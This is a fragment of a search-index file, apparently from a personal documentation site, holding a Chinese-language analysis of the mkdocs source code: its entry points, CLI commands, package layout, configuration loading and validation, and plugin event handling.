load_config\uff08\u5220\u9664\u4e86\u6ce8\u91ca\u548c\u4e00\u4e9b\u7a7a\u884c\uff09\uff1a config/base.py def load_config ( config_file : Optional [ Union [ str , IO ]] = None , ** kwargs ) -> Config : options = kwargs . copy () for key , value in options . copy () . items (): if value is None : options . pop ( key ) with _open_config_file ( config_file ) as fd : options [ 'config_file_path' ] = getattr ( fd , 'name' , '' ) from mkdocs.config import defaults cfg = Config ( schema = defaults . get_schema (), config_file_path = options [ 'config_file_path' ]) cfg . load_file ( fd ) cfg . load_dict ( options ) errors , warnings = cfg . validate () for config_name , warning in warnings : log . warning ( f \"Config value: ' { config_name } '. Warning: { warning } \" ) for config_name , error in errors : log . error ( f \"Config value: ' { config_name } '. Error: { error } \" ) for key , value in cfg . items (): log . debug ( f \"Config value: ' { key } ' = { value !r} \" ) if len ( errors ) > 0 : raise exceptions . Abort ( f \"Aborted with { len ( errors ) } Configuration Errors!\" ) elif cfg [ 'strict' ] and len ( warnings ) > 0 : raise exceptions . Abort ( f \"Aborted with { len ( warnings ) } Configuration Warnings in 'strict' mode!\" ) return cfg \u8fd9\u4e2a\u51fd\u6570\u4e2d\u7684\u6d41\u7a0b\uff1a \u5c06 kwargs \u62f7\u8d1d\u5230 options \u4e2d\uff08\u4e5f\u5c31\u662f\u901a\u8fc7\u547d\u4ee4\u884c\u4f20\u5165\u7684\u53c2\u6570\uff09\u5e76\u5220\u6389\u503c\u4e3a None \u7684\u914d\u7f6e \u901a\u8fc7 _open_config_file \u8fd9\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u6765\u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff0c\u7136\u540e\uff1a \u83b7\u53d6\u5b9e\u9645\u4f7f\u7528\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u540d\uff0c\u5e76\u5b58\u5230 options \u4e2d \u6839\u636e defaults \u521b\u5efa\u4e00\u4e2a Config \u540d\u53eb cfg\uff0c\u5176\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e3a\u4e0a\u9762\u83b7\u5f97\u5230\u7684\u6587\u4ef6\u540d \u5c06\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u8f7d\u5165 cfg \u5c06\u547d\u4ee4\u884c\u53c2\u6570 options \u8f7d\u5165 cfg\uff08\u6b64\u65f6\u6709\u8986\u76d6\uff0c\u5373\u547d\u4ee4\u884c\u914d\u7f6e\u4f18\u5148\u7ea7\u9ad8\u4e8e\u914d\u7f6e\u6587\u4ef6\uff09 \u68c0\u67e5 cfg \u914d\u7f6e\u4e2d\u662f\u5426\u6709\u975e\u6cd5\u4fe1\u606f \u4ee5 debug level \u8f93\u51fa\u6240\u6709\u914d\u7f6e\u9879 \u5982\u679c\u6709\u975e\u6cd5\u914d\u7f6e\u7684\u8bdd\u8f93\u51fa\u5168\u90e8 warnings \u548c errors \u5982\u679c\u6709 error\uff0c\u5219\u76f4\u63a5 abort \u5982\u679c\u6709 warning\uff0c\u4e14\u5f00\u542f\u4e86 strict \u6a21\u5f0f\uff0c\u4e5f\u76f4\u63a5 abort \u8fd4\u56de\u5f97\u5230\u7684 cfg \u914d\u7f6e\u5b9e\u4f8b \u5176\u4e2d\u7684\u4e00\u4e9b\u7ec6\u8282\uff1a _open_config_file \u00b6 \u662f\u7528 contextmanager \u88c5\u9970\u5668\u5305\u88c5\u5f97\u5230\u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff0c\u5176\u63a5\u6536\u4e00\u4e2a\u53c2\u6570 config_file\uff0c\u662f\u4ece\u547d\u4ee4\u884c --config-file \u53c2\u6570\u83b7\u5f97\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff0c\u5982\u679c\u8fd0\u884c\u65f6\u6ca1\u6709\u8fd9\u4e00\u53c2\u6570\u5219 config_file \u4e3a None\u3002\u5176\u5185\u90e8\u6d41\u7a0b\uff1a \u5982\u679c config_file \u4e3a None\uff08\u5373\u672a\u6307\u5b9a\uff09\uff0c\u5219\u9ed8\u8ba4\u5c1d\u8bd5\u8bfb\u53d6\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u914d\u7f6e\u6587\u4ef6 mkdocs.yml \u6216 .yaml \u5982\u679c config_file \u4e3a\u5b57\u7b26\u4e32\uff0c\u5219\u5c1d\u8bd5\u8bfb\u53d6\u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u7684\u6587\u4ef6 \u5982\u679c config_file \u662f\u6587\u4ef6\u5bf9\u8c61 \u5982\u679c\u6587\u4ef6\u662f\u5f00\u542f\u7684\uff0c\u5219\u76f4\u63a5\u5c06\u6587\u4ef6\u6307\u9488\u79fb\u5230\u5f00\u5934 \u5982\u679c\u6587\u4ef6\u65f6\u5173\u95ed\u7684\uff0c\u5219\u83b7\u53d6\u540d\u79f0\uff0c\u6253\u5f00\u6587\u4ef6 \u8bfb\u53d6\u5b8c\u6210\u540e\uff0c\u5173\u6389\u6587\u4ef6 \u521b\u5efa Config\u3001\u8f7d\u5165\u914d\u7f6e \u00b6 Config \u662f\u4e00\u4e2a\u57fa\u4e8e UserDict \u7684\u7c7b\uff0c\u5373\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 [] \u6765\u8bfb\u53d6\u5176\u4e2d .data \u5c5e\u6027\uff08\u5b57\u5178\uff09\u4e2d\u7684\u503c\uff0c\u5176\u5728\u521d\u59cb\u5316\u65f6\u53d1\u751f\u4e86\u4e0b\u9762\u51e0\u4ef6\u4e8b\uff1a \u4ece\u53c2\u6570\u8bbe\u7f6e _schema\uff0c\u5373\u4ece defaults \u4e2d\u8bfb\u53d6\u5230\u7684\u9ed8\u8ba4\u53c2\u6570\u90e8\u5206\u3002\u4ee5\u53ca _schema_keys \u8bbe\u7f6e config_file_path\uff08\u4f1a\u81ea\u52a8\u89e3\u7801 bytes \u7c7b\u578b\uff09 \u521b\u5efa .data \u5b57\u5178\u5c5e\u6027\uff0c\u4ee5\u53ca\u4e00\u4e2a\u7a7a\u7684 user_configs \u5217\u8868\uff0c\u91cc\u9762\u5b58\u653e\u8f7d\u5165\u7684\u5b57\u5178\u539f\u6570\u636e \u8c03\u7528 set_defaults \u65b9\u6cd5\u8bbe\u7f6e\u9ed8\u8ba4\u503c \u5373\u4ece schema \u4e2d\u8bfb\u53d6\u8bbe\u7f6e \u5728\u8c03\u7528 load_file \u65b9\u6cd5\u65f6\u5b9e\u9645\u4e0a\u4f1a\u8bfb\u53d6 yaml \u6587\u4ef6\u5185\u5bb9\uff0c\u89e3\u6790\u6210\u5b57\u5178\u7136\u540e\u8c03\u7528 load_dict \u65b9\u6cd5\u3002\u8c03\u7528 load_dict \u65b9\u6cd5\u65f6\u5148\u5c06\u4f20\u5165\u7684\u5185\u5bb9\u76f4\u63a5\u6dfb\u52a0\u5230 user_configs \u5217\u8868\u4e2d\uff0c\u7136\u540e\u7528\u5176 update data \u5c5e\u6027 \u9a8c\u8bc1 Config \u00b6 \u8c03\u7528 Config.validate \u9a8c\u8bc1\u6709\u4ee5\u4e0b\u51e0\u6b65\uff1a \u8c03\u7528 _pre_validate() \u65b9\u6cd5 \u5176\u4f1a\u904d\u5386 _schema \u6bcf\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u8c03\u7528 config_option \u4e0a\u7684 pre_validation \u65b9\u6cd5\uff0c\u5177\u4f53\u7531\u5b9e\u9645\u5b50\u7c7b\u8fdb\u884c\u5b9e\u73b0 \u8c03\u7528 _validate() \u65b9\u6cd5 \u4e5f\u4f1a\u904d\u5386 _schema \u6bcf\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u4f46\u6b64\u65f6\u4f1a\u5c06\u952e\u5728 config \u4e2d\u5bf9\u5e94\u7684\u503c\u4f20\u5165 config_option \u7684 validate \u65b9\u6cd5\uff08\u7531\u5b50\u7c7b\u7684 run_validation \u65b9\u6cd5\u5b9e\u73b0\uff0c\u8fd4\u56de\u4e00\u4e2a\u4fee\u6b63\u540e\u7684\u503c\uff0c\u91cd\u65b0\u8d4b\u503c\u56de\u6765 \u9664\u6b64\u4e4b\u5916\u8fd8\u4f1a\u68c0\u67e5\u4e0d\u5728 _schema_keys \u4e2d\u7684\u952e\uff0c\u5e76\u629b\u51fa\u8b66\u544a \u5982\u679c\u524d\u9762\u90fd\u6ca1\u6709\u51fa\u73b0 error\uff0c\u5219\u8c03\u7528 _post_validate \u65b9\u6cd5 \u540c pre\uff0c\u53ea\u4e0d\u8fc7\u5bf9 config_option \u8c03\u7528\u7684\u65b9\u6cd5\u4ece pre \u6362\u6210\u4e86 post \u5177\u4f53\u7684\u5404\u4e2a\u53c2\u6570\u7684\u5b9a\u4e49\u548c\u9a8c\u8bc1\u65b9\u6cd5\u90fd\u5728 config/config_options.py \u4e2d\uff0c\u5f88\u8be6\u7ec6\u6613\u61c2 \u89e6\u53d1 Plugin \u4e8b\u4ef6 \u00b6 \u5728\u524d\u9762 ConfigOptions \u4e2d\u6709\u4e00\u4e2a Plugins \u5b50\u7c7b\uff0c\u6765\u5b58\u653e\u63d2\u4ef6\u76f8\u5173\u5bf9\u8c61\uff0c\u5176\u521d\u59cb\u5316\u65f6\u4f1a\u8c03\u7528 plugins.get_plugins() \u51fd\u6570\u6765\u5168\u5c40\u68c0\u67e5\u5b89\u88c5\u7684\u5305\u7684 entry_points \u662f\u5426\u542b\u6709 mkdocs.plugins\uff0c\u6765\u5f97\u5230\u4e00\u4e2a Dict[str, EntryPoint] \u7c7b\u578b\u7684 installed_plugins \u5c5e\u6027\uff08\u5373\u901a\u8fc7\u5305\u540d\u6620\u5c04\u5230\u63d2\u4ef6\u5165\u53e3\u70b9\uff0c\u5373\u63d2\u4ef6\u7c7b\uff09 \u8fd9\u4e2a Plugins \u7c7b\u5728\u4e0a\u9762\u6240\u8bf4\u7684 run_validation \u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u63d2\u4ef6\u540d\u4f20\u5165 load_plugin \u65b9\u6cd5\uff08\u91cc\u9762\u4f1a\u68c0\u67e5\u662f\u5426\u5b89\u88c5\u7b49\u4e00\u7cfb\u5217\u95ee\u9898\uff09\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u63d2\u4ef6\u7c7b\uff0c\u7edf\u4e00\u6536\u96c6\u5230 plugins.PluginCollection \u7c7b\u4e2d\u3002 \u5728\u4e3a PluginCollection setitem \u7684\u65f6\u5019\u4f1a\u5c06\u63d2\u4ef6\u7684\u6240\u6709 on_ \u5f00\u5934\u7684\u65b9\u6cd5\u90fd\u6ce8\u518c\u4e3a event\uff08\u5982 on_startup \u65b9\u6cd5\u4f1a\u6ce8\u518c\u4e00\u4e2a\u540d\u4e3a startup \u7684 event\uff09\uff0c\u5728\u8c03\u7528 run_event(\"startup\") \u7684\u65f6\u5019\u4f1a\u8c03\u7528\u6240\u6709\u6709 on_startup \u65b9\u6cd5\u7684\u63d2\u4ef6\u7684\u8fd9\u4e00\u65b9\u6cd5\uff0c\u4ece\u800c\u6267\u884c\u63d2\u4ef6\u81ea\u5b9a\u4e49\u7684\u521d\u59cb\u5316\u4ee3\u7801\uff08\u540c\u65f6\u53ef\u4ee5\u6839\u636e\u4f20\u5165\u7684 command\uff0c\u5982 \"build\"\u3001\"gh-deploy\"\u3001\"serve\" \u6765\u7279\u5224\u6267\u884c\u4e0d\u540c\u52a8\u4f5c\uff09 \u8c03\u7528 build \u51fd\u6570\u6784\u5efa\u6587\u6863 \u00b6","title":"mkdocs \u6e90\u7801\u5256\u6790"},{"location":"cs/analysis/mkdocs/#mkdocs","text":"Abstract \u6e90\u9879\u76ee\u5730\u5740\uff1a mkdocs/mkdocs \u5256\u6790\u65f6 sha \u503c\uff1a 730da08158","title":"mkdocs \u6e90\u7801\u5256\u6790"},{"location":"cs/analysis/mkdocs/#_1","text":"","title":"\u5305\u914d\u7f6e\u3001\u5165\u53e3\u70b9"},{"location":"cs/analysis/mkdocs/#_2","text":"\u4e00\u4e9b\u57fa\u7840\u914d\u7f6e\u4e0d\u5fc5\u8bf4\uff0c\u4e3b\u8981\u662f entry_points \u914d\u7f6e\uff1a setup ( ... entry_points = { 'console_scripts' : [ 'mkdocs = mkdocs.__main__:cli' , ], 'mkdocs.themes' : [ 'mkdocs = mkdocs.themes.mkdocs' , 'readthedocs = mkdocs.themes.readthedocs' , ], 'mkdocs.plugins' : [ 'search = mkdocs.contrib.search:SearchPlugin' , ], }, ... ) \u53ef\u89c1\u521b\u5efa\u4e86\u4e09\u4e2a entry_points\uff1a CLI \u547d\u4ee4 mkdocs\uff0c\u5165\u53e3\u70b9 mkdocs.__main__:cli mkdocs.themes\uff0c\u7528\u4e8e\u63a5\u5165\u5916\u90e8\u5305\u5b9a\u4e49\u7684\u4e3b\u9898 mkdocs.plugins\uff0c\u7528\u4e8e\u63a5\u5165\u5916\u90e8\u5305\u5b9a\u4e49\u7684\u63d2\u4ef6","title":"\u5305\u914d\u7f6e"},{"location":"cs/analysis/mkdocs/#_3","text":"\u547d\u4ee4\u884c\u7684\u5165\u53e3\u70b9\u4e3a mkdocs.__main__:cli\u3002\u4e0b\u5206\u6790 __main__.py\uff1a log \u76f8\u5173\uff1a \u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 ColorFormatter\uff08 \u6211\u4e0d\u662f\u5f88\u559c\u6b22\u8fd9\u4e2a\u6837\u5f0f\uff0c\u53ef\u4ee5\u6539\u6389 \uff09 \u4e00\u4e2a State \u7528\u4e8e\u7ef4\u62a4\u4e0d\u540c\u547d\u4ee4\u7684 log level\uff08\u540e\u6709 click . make_pass_decorator ( State , ensure = True ) \uff09 cli \u76f8\u5173\uff1a \u5229\u7528 click \u5e93 @click . group ( context_settings = { 'help_option_names' : [ '-h' , '--help' ]}) # \u8bbe\u7f6e help \u547d\u4ee4 @click . version_option ( # \u8bbe\u7f6e version \u547d\u4ee4\u548c\u663e\u793a\u4fe1\u606f __version__ , '-V' , '--version' , message = f '%(prog)s, version %(version)s from { PKG_DIR } (Python { PYTHON_VERSION } )' , ) @common_options # \u901a\u7528\u8bbe\u7f6e def cli (): # \u547d\u4ee4\u884c\u4e3b\u547d\u4ee4 mkdocs \"\"\" MkDocs - Project documentation with Markdown. \"\"\" \u4e00\u4e9b\u5b50\u547d\u4ee4\uff0c\u9009\u9879\u6dfb\u52a0\u4e0e\u4e0a\u9762\u7c7b\u4f3c\uff0c\u4e0d\u8d58\u8ff0 serve \u5b50\u547d\u4ee4\uff1a\u8c03\u7528 mkdocs.commands.serve.serve \u51fd\u6570 build \u5b50\u547d\u4ee4\uff1a\u5904\u7406 config\uff08\u5728 mkdocs.config \u6a21\u5757\u4e2d\u8be6\u7ec6\u5b9a\u4e49\uff09\u3001\u542f\u52a8\u63d2\u4ef6\u3001\u8c03\u7528 mkdocs.commands.build.build \u51fd\u6570\uff0c\u672a\u5931\u8d25\u5219\u8fd0\u884c\u540e\u5173\u95ed\u63d2\u4ef6 gh-deploy \u5b50\u547d\u4ee4\uff1a\u5728 build \u540e\u8c03\u7528 mkdocs.commands.gh_deploy.gh_deploy new \u5b50\u547d\u4ee4\uff1a\u8c03\u7528 mkdocs.commands.new.new \u51fd\u6570","title":"\u5165\u53e3\u70b9"},{"location":"cs/analysis/mkdocs/#_4","text":"\u9664\u53bb tests \u548c\u5176\u5b83\u5197\u4f59\u4ee3\u7801\u540e\uff0c\u5927\u81f4\u5206\u6790\u7684\u6574\u4e2a\u5305\u7ed3\u6784\uff1a mkdocs \u251c\u2500\u2500 __init__.py # \u5b9a\u4e49\u4e86\u7248\u672c\u53f7 \u251c\u2500\u2500 __main__.py # CLI \u5165\u53e3\u70b9 \u251c\u2500\u2500 commands # CLI \u5b9a\u4e49 \u2502 \u251c\u2500\u2500 __init__.py \u2502 \u251c\u2500\u2500 babel.py # \u5904\u7406\u8bed\u8a00\u6587\u4ef6\uff08\u4e0d\u662f CLI \u547d\u4ee4\uff09 \u2502 \u251c\u2500\u2500 build.py # \u6784\u5efa\u6587\u6863\uff08mkdocs build\uff09 \u2502 \u251c\u2500\u2500 gh_deploy.py # \u90e8\u7f72\u5230 Pages\uff08mkdocs gh-deploy\uff09 \u2502 \u251c\u2500\u2500 new.py # \u521b\u5efa\u65b0\u9879\u76ee\uff08mkdocs new\uff09 \u2502 \u251c\u2500\u2500 serve.py # \u5f00\u542f\u672c\u5730\u9884\u89c8\u670d\u52a1\uff08mkdocs serve\uff09 \u2502 \u2514\u2500\u2500 setup.py # \u76ee\u6d4b\u6ca1\u7528\uff1f \u251c\u2500\u2500 config \u2502 \u251c\u2500\u2500 __init__.py # \u53ea\u5bfc\u51fa base \u548c config_options \u2502 \u251c\u2500\u2500 base.py # \u57fa\u7840\u914d\u7f6e \u2502 \u251c\u2500\u2500 config_options.py # \u5404\u79cd\u53c2\u6570\u4ee5\u53ca\u9a8c\u8bc1\u65b9\u5f0f \u2502 \u2514\u2500\u2500 defaults.py # \u9ed8\u8ba4\u914d\u7f6e \u251c\u2500\u2500 contrib \u2502 \u251c\u2500\u2500 __init__.py \u2502 \u2514\u2500\u2500 search \u2502 \u251c\u2500\u2500 __init__.py \u2502 \u251c\u2500\u2500 lunr-language \u2502 \u2502 \u2514\u2500\u2500 ... \u2502 \u251c\u2500\u2500 prebuild-index.js \u2502 \u251c\u2500\u2500 search_index.py \u2502 \u2514\u2500\u2500 templates \u2502 \u2514\u2500\u2500 search \u2502 \u251c\u2500\u2500 lunr.js \u2502 \u251c\u2500\u2500 main.js \u2502 \u2514\u2500\u2500 worker.js \u251c\u2500\u2500 exceptions.py # \u4e00\u4e9b\u5b9a\u4e49\u7684\u5f02\u5e38 \u251c\u2500\u2500 livereload \u2502 \u2514\u2500\u2500 __init__.py # \u672c\u5730\u9884\u89c8\u81ea\u52a8\u5237\u65b0\u670d\u52a1 \u251c\u2500\u2500 localization.py # \u672c\u5730\u5316\u76f8\u5173\u4ee3\u7801 \u251c\u2500\u2500 plugins.py # \u63d2\u4ef6\u7ba1\u7406 \u251c\u2500\u2500 structure # \u9875\u9762\u7ed3\u6784 \u2502 \u251c\u2500\u2500 __init__.py \u2502 \u251c\u2500\u2500 files.py \u2502 \u251c\u2500\u2500 nav.py \u2502 \u251c\u2500\u2500 pages.py \u2502 \u2514\u2500\u2500 toc.py \u251c\u2500\u2500 templates \u2502 \u2514\u2500\u2500 sitemap.xml \u251c\u2500\u2500 theme.py # \u4e3b\u9898\u7c7b \u251c\u2500\u2500 themes \u2502 \u2514\u2500\u2500 ... \u2514\u2500\u2500 utils \u251c\u2500\u2500 __init__.py \u251c\u2500\u2500 babel_stub.py \u251c\u2500\u2500 filters.py \u2514\u2500\u2500 meta.py","title":"\u5305\u7ed3\u6784\u5206\u6790"},{"location":"cs/analysis/mkdocs/#_5","text":"\u548c\u8fd0\u884c\u4e3b\u903b\u8f91\u65e0\u5927\u5173\u7cfb\u7684\u4e00\u4e9b\u4ee3\u7801\uff1a","title":"\u4e00\u4e9b\u5de5\u5177\u6027\u4ee3\u7801"},{"location":"cs/analysis/mkdocs/#exceptionspy","text":"\u5b9a\u4e49\u4e86\u4e94\u4e2a\u5f02\u5e38\u7c7b\uff1a \u57fa\u7c7b MkDocsException\uff0c\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528\u3002\u7ee7\u627f\u81ea ClickException\uff0c\u4f7f click \u80fd\u591f\u5904\u7406\u5e76\u663e\u793a Abort\uff0c\u7ec8\u6b62\u6267\u884c\uff0c\u53ef\u4ee5\u5e26\u6709\u4fe1\u606f ConfigurationError\uff0c\u7531\u4e8e\u914d\u7f6e\u6587\u4ef6\u539f\u56e0\u5bfc\u81f4\u7684\u9519\u8bef BuildError\uff0c\u6784\u5efa\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u9519\u8bef\uff0cmkdocs \u6e90\u7801\u4e2d\u5e76\u672a\u76f4\u63a5\u629b\u51fa\u6b64\u7c7b\u9519\u8bef\uff0c\u4f46\u6709\u5b50\u7c7b PluginError\uff0c\u5e94\u8be5\u662f\u7ed9\u7b2c\u4e09\u65b9\u63d2\u4ef6\u4f7f\u7528\u7684 PluginError\uff0c\u5728\u63d2\u4ef6\u4e2d\u53ef\u4ee5\u629b\u51fa\u7684\u5f02\u5e38\uff0c\u7ee7\u627f\u81ea BuildError","title":"exceptions.py"},{"location":"cs/analysis/mkdocs/#utils","text":"","title":"utils"},{"location":"cs/analysis/mkdocs/#build","text":"\u4ece mkdocs build \u8fd9\u4e00\u547d\u4ee4\u7684\u6267\u884c\u6d41\u7a0b\u6765\u9010\u6b65\u81ea\u9876\u5411\u4e0b\u5206\u6790 \u9996\u5148\u4ece __main__.py \u8fdb\u5165\uff0c\u8c03\u7528\u5230 build_command \u51fd\u6570\uff1a __main__.py 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 @cli . command ( name = \"build\" ) @click . option ( '-c' , '--clean/--dirty' , is_flag = True , default = True , help = clean_help ) @common_config_options @click . option ( '-d' , '--site-dir' , type = click . Path (), help = site_dir_help ) @common_options def build_command ( clean , ** kwargs ): \"\"\"Build the MkDocs documentation\"\"\" from mkdocs.commands import build _enable_warnings () cfg = config . load_config ( ** kwargs ) cfg [ 'plugins' ] . run_event ( 'startup' , command = 'build' , dirty = not clean ) try : build . build ( cfg , dirty = not clean ) finally : cfg [ 'plugins' ] . run_event ( 'shutdown' ) \u5176\u4e2d common_options \u548c common_config_options \u88c5\u9970\u5668\u5b9a\u4e49\u4e3a\uff1a __main__.py 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 common_options = add_options ( quiet_option , verbose_option ) common_config_options = add_options ( click . option ( '-f' , '--config-file' , type = click . File ( 'rb' ), help = config_help ), # Don't override config value if user did not specify --strict flag # Conveniently, load_config drops None values click . option ( '-s' , '--strict' , is_flag = True , default = None , help = strict_help ), click . option ( '-t' , '--theme' , type = click . Choice ( theme_choices ), help = theme_help ), # As with --strict, set the default to None so that this doesn't incorrectly # override the config file click . option ( '--use-directory-urls/--no-directory-urls' , is_flag = True , default = None , help = use_directory_urls_help , ), ) \u4e5f\u5c31\u662f\u589e\u52a0\u4e86 -q -v -f -s -t --use-directory-urls/--no-directory-urls \u8fd9\u4e9b\u547d\u4ee4\u884c\u53c2\u6570\uff08\u4e5f\u4f1a\u4f20\u5230 kwargs \u4e2d\uff09 _enable_warnings() \u53ef\u4ee5\u4e0d\u7528\u7ba1\u3002\u4e4b\u540e\u7684\u6d41\u7a0b\u5c31\u662f\uff1a \u8c03\u7528 config.load_config \u52a0\u8f7d\u914d\u7f6e \u4ece\u914d\u7f6e\u4e2d\u627e\u5230\u63d2\u4ef6\uff0c\u5e76\u89e6\u53d1\u5176 startup \u4e8b\u4ef6 \u5c1d\u8bd5\u8c03\u7528 build.build \u51fd\u6570\u6784\u5efa\u6587\u6863 \u82e5\u4e0d\u6210\u529f\u5219\u76f4\u63a5\u6302\u6389\u7a0b\u5e8f \u82e5\u6210\u529f\u5219\u89e6\u53d1\u63d2\u4ef6\u7684 shutdown \u4e8b\u4ef6\uff0c\u8fd0\u884c\u7ed3\u675f","title":"build \u6d41\u7a0b"},{"location":"cs/analysis/mkdocs/#_6","text":"config/base.py \u4e2d 261 \u884c\u5f00\u59cb\u7684\u51fd\u6570 load_config\uff08\u5220\u9664\u4e86\u6ce8\u91ca\u548c\u4e00\u4e9b\u7a7a\u884c\uff09\uff1a config/base.py def load_config ( config_file : Optional [ Union [ str , IO ]] = None , ** kwargs ) -> Config : options = kwargs . copy () for key , value in options . copy () . items (): if value is None : options . pop ( key ) with _open_config_file ( config_file ) as fd : options [ 'config_file_path' ] = getattr ( fd , 'name' , '' ) from mkdocs.config import defaults cfg = Config ( schema = defaults . get_schema (), config_file_path = options [ 'config_file_path' ]) cfg . load_file ( fd ) cfg . load_dict ( options ) errors , warnings = cfg . validate () for config_name , warning in warnings : log . warning ( f \"Config value: ' { config_name } '. Warning: { warning } \" ) for config_name , error in errors : log . error ( f \"Config value: ' { config_name } '. Error: { error } \" ) for key , value in cfg . items (): log . debug ( f \"Config value: ' { key } ' = { value !r} \" ) if len ( errors ) > 0 : raise exceptions . Abort ( f \"Aborted with { len ( errors ) } Configuration Errors!\" ) elif cfg [ 'strict' ] and len ( warnings ) > 0 : raise exceptions . Abort ( f \"Aborted with { len ( warnings ) } Configuration Warnings in 'strict' mode!\" ) return cfg \u8fd9\u4e2a\u51fd\u6570\u4e2d\u7684\u6d41\u7a0b\uff1a \u5c06 kwargs \u62f7\u8d1d\u5230 options \u4e2d\uff08\u4e5f\u5c31\u662f\u901a\u8fc7\u547d\u4ee4\u884c\u4f20\u5165\u7684\u53c2\u6570\uff09\u5e76\u5220\u6389\u503c\u4e3a None \u7684\u914d\u7f6e \u901a\u8fc7 _open_config_file \u8fd9\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u6765\u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff0c\u7136\u540e\uff1a \u83b7\u53d6\u5b9e\u9645\u4f7f\u7528\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u540d\uff0c\u5e76\u5b58\u5230 options \u4e2d \u6839\u636e defaults \u521b\u5efa\u4e00\u4e2a Config \u540d\u53eb cfg\uff0c\u5176\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e3a\u4e0a\u9762\u83b7\u5f97\u5230\u7684\u6587\u4ef6\u540d \u5c06\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u8f7d\u5165 cfg \u5c06\u547d\u4ee4\u884c\u53c2\u6570 options \u8f7d\u5165 cfg\uff08\u6b64\u65f6\u6709\u8986\u76d6\uff0c\u5373\u547d\u4ee4\u884c\u914d\u7f6e\u4f18\u5148\u7ea7\u9ad8\u4e8e\u914d\u7f6e\u6587\u4ef6\uff09 \u68c0\u67e5 cfg \u914d\u7f6e\u4e2d\u662f\u5426\u6709\u975e\u6cd5\u4fe1\u606f \u4ee5 debug level \u8f93\u51fa\u6240\u6709\u914d\u7f6e\u9879 \u5982\u679c\u6709\u975e\u6cd5\u914d\u7f6e\u7684\u8bdd\u8f93\u51fa\u5168\u90e8 warnings \u548c errors \u5982\u679c\u6709 error\uff0c\u5219\u76f4\u63a5 abort \u5982\u679c\u6709 warning\uff0c\u4e14\u5f00\u542f\u4e86 strict \u6a21\u5f0f\uff0c\u4e5f\u76f4\u63a5 abort \u8fd4\u56de\u5f97\u5230\u7684 cfg \u914d\u7f6e\u5b9e\u4f8b \u5176\u4e2d\u7684\u4e00\u4e9b\u7ec6\u8282\uff1a","title":"\u52a0\u8f7d\u914d\u7f6e"},{"location":"cs/analysis/mkdocs/#_open_config_file","text":"\u662f\u7528 contextmanager \u88c5\u9970\u5668\u5305\u88c5\u5f97\u5230\u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff0c\u5176\u63a5\u6536\u4e00\u4e2a\u53c2\u6570 config_file\uff0c\u662f\u4ece\u547d\u4ee4\u884c --config-file \u53c2\u6570\u83b7\u5f97\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff0c\u5982\u679c\u8fd0\u884c\u65f6\u6ca1\u6709\u8fd9\u4e00\u53c2\u6570\u5219 config_file \u4e3a None\u3002\u5176\u5185\u90e8\u6d41\u7a0b\uff1a \u5982\u679c config_file \u4e3a None\uff08\u5373\u672a\u6307\u5b9a\uff09\uff0c\u5219\u9ed8\u8ba4\u5c1d\u8bd5\u8bfb\u53d6\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u914d\u7f6e\u6587\u4ef6 mkdocs.yml \u6216 .yaml \u5982\u679c config_file \u4e3a\u5b57\u7b26\u4e32\uff0c\u5219\u5c1d\u8bd5\u8bfb\u53d6\u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u7684\u6587\u4ef6 \u5982\u679c config_file \u662f\u6587\u4ef6\u5bf9\u8c61 \u5982\u679c\u6587\u4ef6\u662f\u5f00\u542f\u7684\uff0c\u5219\u76f4\u63a5\u5c06\u6587\u4ef6\u6307\u9488\u79fb\u5230\u5f00\u5934 \u5982\u679c\u6587\u4ef6\u65f6\u5173\u95ed\u7684\uff0c\u5219\u83b7\u53d6\u540d\u79f0\uff0c\u6253\u5f00\u6587\u4ef6 \u8bfb\u53d6\u5b8c\u6210\u540e\uff0c\u5173\u6389\u6587\u4ef6","title":"_open_config_file"},{"location":"cs/analysis/mkdocs/#config","text":"Config \u662f\u4e00\u4e2a\u57fa\u4e8e UserDict \u7684\u7c7b\uff0c\u5373\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 [] \u6765\u8bfb\u53d6\u5176\u4e2d .data \u5c5e\u6027\uff08\u5b57\u5178\uff09\u4e2d\u7684\u503c\uff0c\u5176\u5728\u521d\u59cb\u5316\u65f6\u53d1\u751f\u4e86\u4e0b\u9762\u51e0\u4ef6\u4e8b\uff1a \u4ece\u53c2\u6570\u8bbe\u7f6e _schema\uff0c\u5373\u4ece defaults \u4e2d\u8bfb\u53d6\u5230\u7684\u9ed8\u8ba4\u53c2\u6570\u90e8\u5206\u3002\u4ee5\u53ca _schema_keys \u8bbe\u7f6e config_file_path\uff08\u4f1a\u81ea\u52a8\u89e3\u7801 bytes \u7c7b\u578b\uff09 \u521b\u5efa .data \u5b57\u5178\u5c5e\u6027\uff0c\u4ee5\u53ca\u4e00\u4e2a\u7a7a\u7684 user_configs \u5217\u8868\uff0c\u91cc\u9762\u5b58\u653e\u8f7d\u5165\u7684\u5b57\u5178\u539f\u6570\u636e \u8c03\u7528 set_defaults \u65b9\u6cd5\u8bbe\u7f6e\u9ed8\u8ba4\u503c \u5373\u4ece schema 